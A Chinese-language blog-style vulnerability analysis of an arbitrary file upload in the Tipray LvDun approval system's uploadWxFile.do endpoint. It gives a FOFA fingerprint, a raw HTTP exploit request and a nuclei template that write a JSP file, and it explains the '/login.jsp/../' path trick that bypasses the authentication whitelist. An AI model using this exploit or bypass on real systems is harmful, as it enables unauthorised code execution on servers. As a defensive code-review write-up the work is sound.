# [1Day分析]天锐绿盾审批系统uploadWxFile任意文件上传代码分析复现

## 前言

打hvv遇到的，是任意文件上传的洞，网上还未全面公开，DayDayPoc上要30个积分兑换。其实这个洞相对简单，很适合我这种Java代审小白的体质，本着分析学习的态度，于是有了这篇文章。第一次写漏洞分析的文章，大佬可以不用看了，因为分析得比较基础且啰嗦，当然如果有写得不对的地方还请师傅们多多指教dd~

![image-20250811090534161](https://s2.loli.net/2025/08/11/Y5xn3y6s4SiVGTA.png)

## POC

### fofa指纹

```
app="TIPPAY-绿盾审批系统"
```

### http数据包

```http
POST /trwfe/login.jsp/../config/uploadWxFile.do HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Connection: close
Content-Length: 222
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynvgfpfpm
Accept-Encoding: gzip

------WebKitFormBoundarynvgfpfpm
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

<%out.print("The system has serious vulnerabilities");%>
------WebKitFormBoundarynvgfpfpm--
```

### nuclei-yaml

```yaml
id: TianRui-LvDun-UploadWxFile-RCE
info:
  name: 天锐绿盾审批系统-uploadWxFile.do-任意文件上传
  author: X1ly?S
  severity: critical
  description: 天锐绿盾审批系统-uploadWxFile.do-任意文件上传导致RCE
http:
  - raw:
      - |-
        POST /trwfe/login.jsp/../config/uploadWxFile.do HTTP/1.1
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynvgfpfpm
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36

        ------WebKitFormBoundarynvgfpfpm
        Content-Disposition: form-data; name="file"; filename="rf67ugji89gcs.jsp"
        Content-Type: application/octet-stream

        <%out.print("r768hvdesdi");%>
        ------WebKitFormBoundarynvgfpfpm--
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - 'true'
    
    matchers-condition: and
  - method: GET
    path:
      - '{{BaseURL}}/rf67ugji89gcs.jsp'
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - r768hvdesdi
    
    matchers-condition: and
```

## 漏洞复现

写入test.jsp文件

![image-20250811141439739](https://s2.loli.net/2025/08/11/z5GTCejrZ4Wwgyv.png)

访问test.jsp，复现成功

![image-20250811141823587](https://s2.loli.net/2025/08/11/V9SwkEJpoxsyv35.png)

## 漏洞定位

* 项目结构

项目结构如下，采用了SpringMVC框架写法

![image-20250811091228189](https://s2.loli.net/2025/08/11/OB6w3SgEZ2bmpJt.png)

* 分析漏洞点

由于我们已经有了poc，那分析起来很简单了，首先看这个路由："/trwfe/login.jsp/../config/uploadWxFile.do"

有一个"/../"，说明进行了权限绕过，这个后面分析

项目根路径是"/trwfe"

然后是漏洞路由"/config/uploadWxFile.do"

那我们直接全局搜索"uploadWxFile"

![image-20250811092120347](https://s2.loli.net/2025/08/11/TxioNzLulVmIZY4.png)

直接跟踪到ConfigService的实现 `\com\trwfe\service\impl\ConfigServiceImpl.java`

```java
/*     */   public boolean uploadWxFileToRoot(@RequestParam(value = "file", required = false) MultipartFile file, HttpServletRequest request, HttpServletResponse response) {
/* 851 */     OutputStream os = null;
/*     */     
/* 853 */     String tempPath = System.getProperty("catalina.home") + File.separator + "webapps" + File.separator + "ROOT" + File.separator;
/*     */     
/* 855 */     File pt = new File(tempPath);
/* 856 */     if (!pt.exists()) {
/* 857 */       pt.mkdirs();
/*     */     }
/*     */     try {
/* 860 */       os = new FileOutputStream(new File(tempPath + file.getOriginalFilename()));
/*     */       
/* 862 */       IOUtils.copy(file.getInputStream(), os);
/* 863 */       return true;
/* 864 */     } catch (Exception e) {
/* 865 */       log.error("文件上传异常!", e);
/*     */     } finally {
/* 867 */       IOUtils.closeQuietly(os);
/*     */     } 
/* 869 */     return false;
/*     */   }
/*     */ }

```

任意文件上传+目录跳转漏洞很显而易见了，首先使用springMVC的注解`@RequestParam`接收上传的文件对象

设置tempPath为`/tomcat安装目录/webapps/ROOT/`

然后做文件路径存在判断，不存在则创建

关键是这一行：`os = new FileOutputStream(new File(tempPath + file.getOriginalFilename()));`

直接使用`tempPath + file.getOriginalFilename()`拼接了未经任何处理的文件名

至少，在这个方法里uploadWxFileToRoot没有对文件名后缀进行任何过滤，也没有对目录跳转符进行任何过滤，但是到底是否真的能任意文件上传和目录跳转，我们还可以简单看看一些可能有过滤的位置，比如过滤器，拦截器，AOP。

## 过滤分析

怎么找该漏洞点的过滤代码呢？对于SpringMVC的架构项目来说，一般过滤性的代码会出现在以下位置

1. 过滤器

过滤器没有发现明显的文件上传过滤逻辑

![image-20250811114332132](https://s2.loli.net/2025/08/11/IFdZ7SPuNwmJOvX.png)

2. 拦截器

拦截器也只有这一个，也没有发现明显的文件上传过滤逻辑

该拦截器作用是：利用自定义注解`@Token`控制是否生成或校验Token，防止重复提交

![image-20250811114501189](https://s2.loli.net/2025/08/11/ACXZvuQwonKHPcp.png)

3. AOP切面

同上，AOP也没有过滤逻辑，它的作用是：从当前HTTP请求里提取登录用户信息，并放入线程上下文中，方便后续代码直接获取当前用户，无需重复从请求里取

![image-20250811114653795](https://s2.loli.net/2025/08/11/NOmg7fvnsxDEylo.png)

于是我们可以断定这个任意文件上传漏洞是真实存在的！

## 路由分析

漏洞点分析出来没有任何过滤，然后我们分析路由

既然漏洞点位于`\com\trwfe\service\impl\ConfigServiceImpl.java`那么根据命名规则我们直接去看Config的控制器，搜索uploadWxFile

找到了方法@RequestMapping：/uploadWxFile.do

![image-20250811093921808](https://s2.loli.net/2025/08/11/9GLk3qenv6NZxFu.png)

再看类级别的@RequestMapping：/config

![image-20250811094054581](https://s2.loli.net/2025/08/11/KE9f7P1xbvz6NJU.png)

再加上项目上下文根路径：/trwfe

Context Path是由内嵌 Jetty 服务器启动类 `com.trwfe.Jetty` 中的 `WebAppContext` 构造参数指定的，设置为 `/trwfe`

![image-20250811112557147](https://s2.loli.net/2025/08/11/2lkyedws8GKM4Zm.png)

于是漏洞路由就是：`/trwfe/config/uploadWxFile.do`

## 鉴权绕过

找到了路由，还要分析鉴权，看这个接口是否是后台的，如果是能否绕过直接前台上传任意文件RCE？不能绕过的话危害就大打折扣了，因为要先取得后台权限才能上传任意文件了

怎么找鉴权的代码呢？其实和找过滤代码的方法类似，也是看过滤器，拦截器，AOP

过滤器会拦截所有进入Servlet容器的请求，做统一的认证、鉴权、跨域、日志等操作。

找法：搜索项目中实现了 `javax.servlet.Filter` 的类，尤其是继承 `OncePerRequestFilter` 或 `DelegatingFilterProxy` 的。重点看 `doFilter()` 方法中对请求路径和Session/Token的判断。

**在Spring MVC项目中，很多项目会写一个 `SecurityFilter`、`AuthFilter`、`SessionFilter` 等。用来做鉴权**

我们直接找有没有这些类

于是来到过滤器：`\com\trwfe\filter\SecurityFilter.java`

![image-20250811094436314](https://s2.loli.net/2025/08/11/jDxiIVwflY32rz9.png)

```java
/*    */ public class SecurityFilter
/*    */   extends DelegatingFilterProxy
/*    */ {
/*    */   public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws IOException, ServletException {
/* 18 */     HttpServletRequest request = (HttpServletRequest)servletRequest;
/* 19 */     HttpServletResponse response = (HttpServletResponse)servletResponse;
/*    */     
/* 21 */     String url = request.getRequestURI();
/* 22 */     if (SessionFilter.isNoNeedValidate(url, request)) {
/* 23 */       chain.doFilter(servletRequest, servletResponse);
/*    */     } else {
/*    */       
/* 26 */       super.doFilter((ServletRequest)request, (ServletResponse)response, chain);
/*    */     } 
/*    */   }
/*    */ }
```

这段 `SecurityFilter` 代码的逻辑就是用来鉴权的，是一个**请求入口过滤器**，在请求到达真正的Controller之前，先做一层**白名单判断**，然后再决定是否进入真正的鉴权逻辑。

调用 `SessionFilter.isNoNeedValidate` 静态方法，判断当前 URL 是否在 **免鉴权白名单**中

我们怎么确定这段鉴权的代码被应用到了我们的漏洞路由：`/trwfe/config/uploadWxFile.do`呢？

看web.xml配置

```xml
	<filter>
		<filter-name>springSecurityFilterChain</filter-name>
		<filter-class>
			com.trwfe.filter.SecurityFilter
		</filter-class>
		<init-param>
			<param-name>excludedPages</param-name>
			<param-value>user/logon.do</param-value>
		</init-param>
	</filter>

	<filter-mapping>
		<filter-name>springSecurityFilterChain</filter-name>
		<url-pattern>*.do</url-pattern>
	</filter-mapping>
	<filter-mapping>
		<filter-name>springSecurityFilterChain</filter-name>
		<url-pattern>/rest/*</url-pattern>
		<dispatcher>ERROR</dispatcher>
		<dispatcher>REQUEST</dispatcher>
	</filter-mapping>
	
```

这里表示对所有`.do`结尾的路由都使用这个过滤器鉴权

```xml
<filter-mapping>
	<filter-name>springSecurityFilterChain</filter-name>
	<url-pattern>*.do</url-pattern>
</filter-mapping>
```

### 流程

1. 用户请求 `/trwfe/config/uploadWxFile.do`
2. web.xml 的 `<url-pattern>*.do</url-pattern>` → 请求先进入 `springSecurityFilterChain`
3. `DelegatingFilterProxy` → 转发给 Spring Security 里的 `SecurityFilter`
4. `SecurityFilter.doFilter()` → 调用 `SessionFilter.isNoNeedValidate(url, request)`
5. 如果在白名单 → 放行，不做鉴权
6. 如果不在白名单 → 执行 Spring Security 的认证/授权流程

那么`/trwfe/config/uploadWxFile.do`肯定就是走这个过滤器鉴权的了，于是我们跟进到SessionFilter看isNoNeedValidate白名单的定义

![image-20250811135932609](https://s2.loli.net/2025/08/11/HXpblVRM5qedvAT.png)

```java
/*     */   public static boolean isNoNeedValidate(String url, HttpServletRequest request) {
/*  73 */     String[] paths = { "/login.jsp", "/user/logon.do", "/service/", "/menu/getI18N.do", "/menu/getLang.do", "/task/findTaskByIdToDingding.do", "/file/dingApproval.do", "/file/isFileExists.do", "/file/downloadFileTr.do", "/config/findAll.do", "/task/findTaskDing.do", "/task/getUserIdByCode_Ding.do", "/task/getUserMobileToDing.do", "/dept/findDepartmentTree.do", "/file/changeLevel.do", "/tasl/updateParameter.do", "/file/dingdingRelieveApproval.do", "/task/findTaskPage.do", "/task/dingFindHistory.do", "/config/findByPk.do", "/task/dispatch.do", "/fanwei/fanweiDispatch.do", "/taskCommon/dispatch.do", "/pages/fanweioa/fanweiApproval.jsp", "/config/findByUserId.do", "/task/ishandle.do", "/file/isDecryptionFileExits.do", "/file/downFileByconfirm.do", "/file/isDensityFileExists.do", "/file/downloadDensityFile.do", "/ding/", "/wx/", "/fanwei/", "/file/editRelieveVal.do", "/task/finddensityConfirmationComments.do", "/file/updateCancelWMVal.do", "/file/updateCancelWMVal.do", "/file/updateCancelWMValSlot.do", "/invoker/findCategoryCombo.do", "/file/downloadFileTrDlp.do", "/file/isFileExistsDlp.do", "/editor/isPreview.do", "/file/downloadEx.do", "/editor/dispatch.do", "/file/getTxtContent.do", "/file/downloadFileExtranet.do", "/file/asyncDownload.do", "/file/getStatus.do", "/file/downloadByUuid.do", "/file/getCompressPackageFileList.do", "/editor/isPreviewByFileName.do", "/file/getCompressPackageFileListByName.do", "/task/validateDdApprover.do", "/task/updateFileOutSendParameter.do", "/task/findNodeChild.do", "/task/fileList.do", "/thirdSystemConfig/getFlowNodeInfo.do", "/task/updateScreenshotParamD.do", "/user/randomCode.do", "/user/showRandomCode.do", "/user/userUnLock.do" };
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*  86 */     for (String path : paths) {
/*  87 */       if (url.startsWith(request.getContextPath() + path)) {
/*  88 */         return true;
/*     */       }
/*     */     } 
/*  91 */     return isDdWxDownLoad(url, request);
/*     */   }
/*     */ 
```

可以看到我们的漏洞路由：`/config/uploadWxFile.do`不在白名单里

![image-20250811140148809](https://s2.loli.net/2025/08/11/f1MQkmAuZ6x3RoC.png)

所以直接请求他是会走鉴权逻辑的

![image-20250811142155922](https://s2.loli.net/2025/08/11/jFkysofKHQ8xWC4.png)

怎么绕过这个鉴权呢？

看这里的路径匹配逻辑

```java
/*  86 */     for (String path : paths) {
/*  87 */       if (url.startsWith(request.getContextPath() + path)) {
/*  88 */         return true;
/*     */       }
/*     */     } 
/*  91 */     return isDdWxDownLoad(url, request);
/*     */   }
/*     */ 
```

1. 遍历所有白名单路径前缀。
2. 如果请求 URL 是这些前缀之一（加项目根路径），直接跳过鉴权。
3. 否则调用 `isDdWxDownLoad()` 看是否属于特例白名单。
4. 如果都不是 → 进入鉴权过滤器逻辑。

那么就很简单了，原理是鉴权的路由匹配逻辑存在缺陷，**仅仅校验了路由是否是以白名单的前缀开始，并且没有对文件路径做目录跳转符的过滤**，因为 login.jsp 在白名单中，startsWith判断发现是以白名单路由开头的，于是会在遇到 ../ 之前匹配成功，从而放行我们的绕过路由。于是我们这样构造就能成功绕过鉴权：`/trwfe/config/uploadWxFile.do` -> `/trwfe/login.jsp/../config/uploadWxFile.do`，或者`/trwfe/service/../config/uploadWxFile.do`等等都行！

![image-20250811143208485](https://s2.loli.net/2025/08/11/4vMeHo5wk3Slmjt.png)

